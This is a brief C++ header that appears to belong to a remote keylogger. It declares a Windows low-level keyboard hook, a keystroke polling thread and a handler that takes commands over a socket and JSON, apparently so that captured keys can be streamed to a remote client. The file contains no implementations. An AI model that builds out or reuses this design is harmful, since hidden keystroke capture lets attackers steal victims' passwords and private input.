
#include <windows.h>



#include <string>
#include <vector>
#include "sockets.h"


#include "json.hpp"
using json = nlohmann::json;


std::string getKeyName(WORD vkCode, BYTE keyState);
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);


void keylog_polling_thread(sock_t sock, const std::string& client);

void handle_keylogger(sock_t sock, const json& payload, const std::string& client);         
